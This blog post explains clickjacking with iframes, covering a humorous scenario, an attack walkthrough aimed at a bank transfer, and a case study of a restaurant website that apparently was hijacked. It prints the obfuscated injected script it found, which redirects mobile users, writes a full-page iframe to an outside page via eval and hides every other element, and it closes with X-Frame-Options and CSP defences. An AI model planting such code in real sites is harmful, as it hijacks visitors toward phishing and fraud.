<p>Little did you know there was a transparent overlaid iframe on top of that button that takes you to a <strong>fake page</strong>.</p>
<p><img src="https://i.kym-cdn.com/photos/images/original/000/692/118/2db.jpg" alt="Ruse"></p>
<p>A new tab opens and at this point, the only thing separating you and quality entertainment is a single spinner in the middle of the page with a message at the top saying, "Preparing your super fast 1000 TB/s download from our 100% uptime hosts..."</p>
<p><img src="https://media1.tenor.com/images/2676bbb3b2f48a87d7f90aaf8390a8f9/tenor.gif?itemid=10466614" alt="Yes Spongebob GIF - Yes Spongebob Plankton GIFs"></p>
<p>But wait! A modal pops up. It reads, "Puppies around the world are in dire need of treats. Your donation can help feed millions of treat deprived puppies year-round."</p>
<p>Being the benevolent netizen you are, you enter your name, address, phone number, credit card number, an amount of $10, social security number, biggest fear, and your SAT math score because who else will think of the puppies. You think to yourself: I did a good today.</p>
<p>The modal exits and the spinner disappears. A blank screen of mockery lies before you. You think maybe it will reappear after a few seconds. It doesn't. Ok, maybe a few minutes. It still doesn't. Shit.</p>
<p>Even though this is a very extreme case of falling for a clickjacking attack, the overall idea of how it works remains the same in pretty much all cases. However this technique has morphed into other subcategories that include <strong>likejacking</strong> (for you social media addicts), <strong>nested</strong> (Google+ targeted), <strong>cursorjacking</strong>, <strong>mousejacking</strong>, <strong>browserless</strong>, <strong>cookiejacking</strong>, <strong>filejacking</strong>, and <strong>password manager attacks</strong> (takes advantage of the fact that your password manager auto-fills forms for you).</p>
<h2>Real Life Encounter</h2>
<p>While browsing Google Maps for restaurants, I stumbled across a dim sum place I've never tried before. On the left panel, Google Maps listed the usual information -- name, address, website, etc. Since I usually check every website for a menu, I opened the link.</p>
<p>I thought to myself, this had to be the strangest website I've ever seen. Rather than being greeted with maybe a slightly outdated design with a carousel of food pictures, instead, I was assaulted with a plethora of flashing banners, promises of riches, and poor color choices. This was not a dim sum website -- this was an online Chinese casino.</p>
<p>For cases like these, it is very easy to tell since the content you see is drastically different than what you were expecting. Most people would be able to pick up this difference and safely navigate away from the page. However, clickjacking comes in much more nefarious flavors where iframes are carefully placed across pages to make you believe that the action you are performing is for the site you are on and not some shady page.</p>
<h2>How It Works</h2>
<p>Despite showing the address of the page you expect, you can tell that the page loaded is completely different for this example. However, this tactic can be quite effective for phishing the average internet user when done correctly -- given that the phishing page is made convincing enough.</p>
<p>I did some experimentation to see if this exploit worked on both HTTP and HTTPS -- which it does. The one thing I discovered that stops this from being an effective attack vector is the use of <code class="language-text">X-Frame-Options</code>.</p>
<h3>X-Frame-Options</h3>
<p><code class="language-text">X-Frame-Options</code> is an HTTP response header or security header that dictates if the request page in the iframe is allowed to be loaded. It applies to any HTML element that can display content from some other sites, such as <code class="language-text">&lt;frame&gt;</code>, <code class="language-text">&lt;iframe&gt;</code>, <code class="language-text">&lt;embed&gt;</code>, and <code class="language-text">&lt;object&gt;</code> to prevent clickjacking attacks from happening.</p>
<p>This header can be set with 3 different values:</p>
<ul>
<li><code class="language-text">DENY</code> - the page can never be loaded in an iframe.</li>
<li><code class="language-text">SAMEORIGIN</code> - the page can only load in an iframe as long as the host page is in the same origin.</li>
<li><code class="language-text">ALLOW-FROM &lt;uri&gt;</code> - this no longer works and this is <strong>bad</strong>. Don't ever use it. It is only here to support older browsers. This is why we cannot have nice things.</li>
</ul>
<p>Given the first two options, this means that your local script kiddie can't scam others online with an iframe displaying the Paypal "donate" button with the form prefilled with $1000. Let me explain how this sophisticated hacker can launch the attack:</p>
<ol>
<li>Some Fortnite player, Alice, is bored and wants to get some kick out of scamming other players. They decide to use their script-kiddie skills to whip up a convincing-looking website that promises players rare skins for <strong>free</strong>. For this example, our victim is named Bob.</li>
<li>Alice knows that some bank does not use <code class="language-text">X-Frame-Options</code> to protect their website, which means that this will be the target audience for the attack.</li>
<li>In the background, a script is executed to check if Bob is logged into the bank that the attacker is targeting. If so, an invisible iframe is loaded up prefilled with a corresponding transfer amount. The iframe is positioned in such a way that the  "Confirm Transfer" button is super-imposed on the "Download" button for each skin.</li>
<li>Bob opens the site and selects a skin. The skin is shown on a page with a big green flashing download button in the center. Bob clicks on it thinking he'll be the coolest player out of his friend group, not knowing he made a huge mistake.</li>
<li>The bank page proceeds to process the transaction while Bob ends up downloading a text file containing some bull sh*t instructions on how he can redeem the skin with a fake product code.</li>
</ol>
<h3>The Code</h3>
<p>So Stan, where's the code? Glad you asked.</p>
<p>The execution of this attack is slightly different than the previous approaches I've mentioned. In short, what the script does is hide all the contents of the legitimate version of the website and creates an iframe showing the Chinese online casino page. Now, this is quite obvious to anyone that this website has nothing to do with this casino. However, this technique could be used to superimpose a realistic-looking page acting as the website (this can be done if the owner's account for the hosting company was compromised and an attacker set up the clickjacking attack to lure people into handing over money).</p>
<p>When I opened the source code of the page, it was just normal looking Bootstrap templates with a couple of red flags. Other than some other weird JS being executed, I isolated the snippet of code where the clickjacking script lives:</p>
<div class="gatsby-highlight" data-language="html"><pre class="language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>

    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Title Page<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>keywords<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Content-Type<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/html; charset=utf-8<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>

    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>description<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>author<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>

    <span class="token comment">&lt;!-- Some 百度 Analytics Code --></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> bp<span class="token operator">=</span>document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">"script"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> curProtocol<span class="token operator">=</span>window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>protocol<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>curProtocol<span class="token operator">===</span><span class="token string">"https"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>bp<span class="token punctuation">.</span>src<span class="token operator">=</span><span class="token string">"https://zz.bdstatic.com/linksubmit/push.js"</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>bp<span class="token punctuation">.</span>src<span class="token operator">=</span><span class="token string">"http://push.zhanzhang.baidu.com/push.js"</span><span class="token punctuation">}</span><span class="token keyword">var</span> s<span class="token operator">=</span>document<span class="token punctuation">.</span><span class="token function">getElementsByTagName</span><span class="token punctuation">(</span><span class="token string">"script"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>s<span class="token punctuation">.</span>parentNode<span class="token punctuation">.</span><span class="token function">insertBefore</span><span class="token punctuation">(</span>bp<span class="token punctuation">,</span>s<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://123.123.123.123/script.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span> <span class="token comment">&lt;!-- What is this? --></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>

  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
  <span class="token comment">&lt;!-- Content --></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre></div>
<p>Strange. A script tag referencing code that lives in some random IP address with HTTP connections. LGTM 👍.</p>
<div class="gatsby-highlight" data-language="js"><pre class="language-js"><code class="language-js"><span class="token comment">/* Some more Baidu Analytics code to track your activity */</span>
<span class="token keyword">var</span> _hmt <span class="token operator">=</span> _hmt <span class="token operator">||</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">var</span> hm <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">"script"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  hm<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token string">"https://hm.baidu.com/hm.js?12345"</span><span class="token punctuation">;</span>
  <span class="token keyword">var</span> s <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementsByTagName</span><span class="token punctuation">(</span><span class="token string">"script"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span> 
  s<span class="token punctuation">.</span>parentNode<span class="token punctuation">.</span><span class="token function">insertBefore</span><span class="token punctuation">(</span>hm<span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">goPAGE</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>navigator<span class="token punctuation">.</span>userAgent<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token regex">/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href <span class="token operator">=</span> <span class="token string">"http://www.maliciouspage.com"</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token keyword">var</span> ss <span class="token operator">=</span> <span class="token string">'&lt;center id="importantDiv">&lt;ifr'</span> <span class="token operator">+</span> <span class="token string">'ame scrolling="no" marginheight=0 marginwidth=0  frameborder="0" width="100%" width="14'</span> <span class="token operator">+</span> <span class="token string">'00" height="108'</span> <span class="token operator">+</span> <span class="token string">'88" src="http://www.maliciouspage.com">&lt;/iframe>&lt;/center>'</span><span class="token punctuation">;</span>
        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"do"</span> <span class="token operator">+</span> <span class="token string">"cu"</span> <span class="token operator">+</span> <span class="token string">"ment.wr"</span> <span class="token operator">+</span> <span class="token string">"ite('"</span> <span class="token operator">+</span> ss <span class="token operator">+</span> <span class="token string">"');"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token function">setInterval</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">try</span> <span class="token punctuation">{</span>
                    document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"div"</span> <span class="token operator">+</span> <span class="token string">"All"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>style<span class="token punctuation">.</span>display <span class="token operator">=</span> <span class="token string">"no"</span> <span class="token operator">+</span> <span class="token string">"ne"</span>
                <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> document<span class="token punctuation">.</span>body<span class="token punctuation">.</span>children<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token keyword">try</span> <span class="token punctuation">{</span>
                        <span class="token keyword">var</span> tagname <span class="token operator">=</span> document<span class="token punctuation">.</span>body<span class="token punctuation">.</span>children<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>tagName<span class="token punctuation">;</span>
                        <span class="token keyword">var</span> myid <span class="token operator">=</span> document<span class="token punctuation">.</span>body<span class="token punctuation">.</span>children<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>id<span class="token punctuation">;</span>
                        <span class="token keyword">if</span> <span class="token punctuation">(</span>myid <span class="token operator">!=</span> <span class="token string">"iconDiv1"</span> <span class="token operator">&amp;&amp;</span> myid <span class="token operator">!=</span> <span class="token string">"importantDiv"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                            document<span class="token punctuation">.</span>body<span class="token punctuation">.</span>children<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>style<span class="token punctuation">.</span>display <span class="token operator">=</span> <span class="token string">"non"</span> <span class="token operator">+</span> <span class="token string">"e"</span>
                        <span class="token punctuation">}</span>
                    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token function">goPAGE</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></div>
<p>Notice how some of the JavaScript that is shown above is obfuscated to escape detection. The first portion of the code is just a classic analytics code sent to Baidu. The second part with the <code class="language-text">goPAGE()</code> function is the meat of the exploit.</p>
<p>It first checks if you are using a mobile device and redirects you directly to the website if you are.</p>
<div class="gatsby-highlight" data-language="js"><pre class="language-js"><code class="language-js"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>navigator<span class="token punctuation">.</span>userAgent<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token regex">/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href <span class="token operator">=</span> <span class="token string">"http://www.maliciouspage.com"</span>
<span class="token punctuation">}</span></code></pre></div>
<p>Otherwise, the iframe is injected into the page directly by calling the <code class="language-text">eval()</code> function. The code it evaluates is broken up in such a way to avoid any detection. However, it is quite easy to spot just by looking at it.</p>
<div class="gatsby-highlight" data-language="js"><pre class="language-js"><code class="language-js"><span class="token keyword">var</span> ss <span class="token operator">=</span> <span class="token string">'&lt;center id="importantDiv">&lt;ifr'</span> <span class="token operator">+</span> <span class="token string">'ame scrolling="no" marginheight=0 marginwidth=0  frameborder="0" width="100%" width="14'</span> <span class="token operator">+</span> <span class="token string">'00" height="108'</span> <span class="token operator">+</span> <span class="token string">'88" src="http://www.maliciouspage.com">&lt;/iframe>&lt;/center>'</span><span class="token punctuation">;</span>
<span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"do"</span> <span class="token operator">+</span> <span class="token string">"cu"</span> <span class="token operator">+</span> <span class="token string">"ment.wr"</span> <span class="token operator">+</span> <span class="token string">"ite('"</span> <span class="token operator">+</span> ss <span class="token operator">+</span> <span class="token string">"');"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></div>
<p>Finally, an interval function is executed to hide all elements except the iframe every 100ms.</p>
<div class="gatsby-highlight" data-language="js"><pre class="language-js"><code class="language-js"><span class="token keyword">try</span> <span class="token punctuation">{</span>
  <span class="token function">setInterval</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">try</span> <span class="token punctuation">{</span>
      document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"div"</span> <span class="token operator">+</span> <span class="token string">"All"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>style<span class="token punctuation">.</span>display <span class="token operator">=</span> <span class="token string">"no"</span> <span class="token operator">+</span> <span class="token string">"ne"</span>
    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> document<span class="token punctuation">.</span>body<span class="token punctuation">.</span>children<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">try</span> <span class="token punctuation">{</span>
        <span class="token keyword">var</span> tagname <span class="token operator">=</span> document<span class="token punctuation">.</span>body<span class="token punctuation">.</span>children<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>tagName<span class="token punctuation">;</span>
        <span class="token keyword">var</span> myid <span class="token operator">=</span> document<span class="token punctuation">.</span>body<span class="token punctuation">.</span>children<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>id<span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>myid <span class="token operator">!=</span> <span class="token string">"iconDiv1"</span> <span class="token operator">&amp;&amp;</span> myid <span class="token operator">!=</span> <span class="token string">"importantDiv"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
          document<span class="token punctuation">.</span>body<span class="token punctuation">.</span>children<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>style<span class="token punctuation">.</span>display <span class="token operator">=</span> <span class="token string">"non"</span> <span class="token operator">+</span> <span class="token string">"e"</span>
        <span class="token punctuation">}</span>
      <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span></code></pre></div>
<p>On the surface, this attack doesn't seem too complicated to understand. However, it can be used mislead users to hand over sensitive information in a legitimate-looking website. Also, this can be especially lethal when the website loaded in the iframe uses HTTP (which only works if the parent page is also HTTP).</p>
<p>I created a quick <a href="https://codepen.io/spiderpig86/pen/JjGBbXQ" target="_blank" rel="noopener noreferrer">example</a> on Codepen to demonstrate how it works. In this example, a "malicious" sign up page is presented to you after loading some websites requiring social media credentials.</p>
<h2>Conclusion/Prevention</h2>
<p>In short, Clickjacking is a commonly used tactic attackers use to mislead users into performing actions they are not aware of. Now, this attack doesn't use sophisticated tactics to break into some system, however, it is still quite effective along with other tactics that involve the human condition, such as phishing.</p>
<p><img src="https://github.com/Spiderpig86/blog/blob/master/images/Clickjacking%20Using%20Iframes%20A%20Case%20Study/What_people_think_programming_is_vs._how_it_actually_is.gif?raw=true" alt="Hackerman"></p>
<p>For any website maintainer, a couple of ways to defend against this attack is:</p>
<ol>
<li>Set the correct <code class="language-text">X-Frame-Options</code> to disallow any access to your page from other domains. For a more up to date solution, use a Content Security Policy (CSP) to disallow any frame to load content from other domains of origin.</li>
<li>Ensure that the main page itself is always the top-level frame.</li>
</ol>
<p>As for users, it is always important to remain vigilant for any dodgy offers of money, hot singles in your area, and ads for cheap treatments that doctors ABSOLUTELY hate.</p>
<h2>References</h2>
<ul>
<li>Wikipedia contributors. "Clickjacking." <em>Wikipedia, The Free Encyclopedia</em>. Wikipedia, The Free Encyclopedia, 21 Jun. 2020. Web. 12 Jul. 2020.</li>
<li>“Clickjacking.” <em>OWASP</em>, owasp.org/www-community/attacks/Clickjacking.</li>
<li>“The Clickjacking Attack.” <em>The Modern JavaScript Tutorial</em>, 29 June 2019, javascript.info/clickjacking.</li>
</ul></div></div><hr style="background-color:var(--hr);margin-bottom:3rem"/><div class="Share-module--share--3hhFg"><h4 class="Share-module--share__title--2Zlwv">Sharing is caring</h4><div class="Share-module--share__container--_nRPy"><a rel="noopener noreferrer" href="https://www.facebook.com/sharer/sharer.php?u=https://spiderpig86.github.ioblog/clickjacking-using-iframes:-a-case-study" target="__blank" class="Share-module--sharebtn__facebook--2eSJE"><span class="icon-container"><i class="fa fa-facebook"></i></span></a><a rel="noopener noreferrer" href="https://twitter.com/intent/tweet?url=https://spiderpig86.github.ioblog/clickjacking-using-iframes:-a-case-study&amp;text=Clickjacking Using Iframes: A Case Study by @hudididudidi" target="__blank" class="Share-module--sharebtn__twitter--3CWNs"><span class="icon-container"><i class="fa fa-twitter"></i></span></a><a rel="noopener noreferrer" href="https://www.linkedin.com/sharing/share-offsite/?url=https://spiderpig86.github.ioblog/clickjacking-using-iframes:-a-case-study" target="__blank" class="Share-module--sharebtn__linkedin--2urSS"><span class="icon-container"><i class="fa fa-linkedin"></i></span></a><a rel="noopener noreferrer" href="https://www.reddit.com/submit?url=https://spiderpig86.github.ioblog/clickjacking-using-iframes:-a-case-study&amp;title=Clickjacking Using Iframes: A Case Study" target="__blank" class="Share-module--sharebtn__reddit--270gh"><span class="icon-container"><i class="fa fa-reddit"></i></span></a></div><hr style="background-color:#ddd;margin-bottom:3rem"/></div><div class="More-module--more--qkU_6"><h4 class="More-module--more__title--3ohFo">Suggested Posts</h4><div class="More-module--more__links--2euLb"><div class="More-module--morelink--1Fzl5"><div><a href="/blog/cobol---the-hottest-programming-language-out-there" class="More-module--morelink__title--3hNp9">COBOL — The Hottest Programming Language Out There</a><p class="More-module--morelink__subtitle--3Hn73">May 3, 2020</p><div><p class="More-module--morelink__description--2qmqV">COBOL is the past, present, and future.</p></div></div></div><div class="More-module--morelink--1Fzl5"><h6 class="More-module--morelink__title--3hNp9">Hmm... Looks like you&#x27;ve reached the end.</h6></div></div></div><hr style="background-color:var(--hr);margin-bottom:3rem"/><div></div></div><div style="min-width:300px"><div style="background-color:var(--bg-secondary);box-shadow:0 0.2rem 1.25rem 0 rgba(27, 30, 36, 0.07);max-width:960px;padding:1rem;margin-bottom:2rem;margin-top:1rem;position:sticky;top:7rem"><div class="row" style="margin-bottom:1rem">✏️ Published <strong>July 12, 2020</strong></div><div class="row" style="margin-bottom:1rem">⏲ <strong>9</strong> <!-- -->minutes</div><div class="row" style="margin-bottom:1rem"><a style="align-items:center;background-color:#acac53;border-radius:.25rem;cursor:pointer;display:inline-flex;font-size:1rem;font-weight:400;line-height:1.2;min-height:1.5rem;padding:.25rem .5rem;margin:.25rem;color:#fff" href="/blog/tag/security">security</a><a style="align-items:center;background-color:#ac5393;border-radius:.25rem;cursor:pointer;display:inline-flex;font-size:1rem;font-weight:400;line-height:1.2;min-height:1.5rem;padding:.25rem .5rem;margin:.25rem;color:#fff" href="/blog/tag/clickjacking">clickjacking</a><a style="align-items:center;background-color:#d2982d;border-radius:.25rem;cursor:pointer;display:inline-flex;font-size:1rem;font-weight:400;line-height:1.2;min-height:1.5rem;padding:.25rem .5rem;margin:.25rem;color:#fff" href="/blog/tag/attacks">attacks</a></div></div></div></div></div></div></div></div></div><script id="gatsby-script-loader">/*<![CDATA[*/window.pagePath="/clickjacking-using-iframes:-a-case-study";/*]]>*/</script><script id="gatsby-chunk-mapping">/*<![CDATA[*/window.___chunkMapping={"app":["/app-77af9155c03470a30bba.js"],"component---node-modules-gatsby-plugin-offline-app-shell-js":["/component---node-modules-gatsby-plugin-offline-app-shell-js-9edabb9556448a6822d1.js"],"component---src-templates-tag-template-js":["/component---src-templates-tag-template-js-e1b96b1920cba7b6f08c.js"],"component---src-templates-post-template-js":["/component---src-templates-post-template-js-f58517086d391b5adabe.js"],"component---src-pages-404-js":["/component---src-pages-404-js-3b274765841898a8e86d.js"],"component---src-pages-index-js":["/component---src-pages-index-js-9f1870ffc86497cb2f93.js"],"component---src-pages-page-2-js":["/component---src-pages-page-2-js-d33f7b3aa306fccdc558.js"],"component---src-pages-tags-js":["/component---src-pages-tags-js-6a67897c145704d5162d.js"]};/*]]>*/</script><script src="/blog/component---src-templates-post-template-js-f58517086d391b5adabe.js" async=""></script><script src="/blog/commons-c915896a95d3515d63cd.js" async=""></script><script src="/blog/styles-ddd3856516bfb2b8e9af.js" async=""></script><script src="/blog/app-77af9155c03470a30bba.js" async=""></script><script src="/blog/webpack-runtime-b8a814a91ec106d5d372.js" async=""></script></body></html>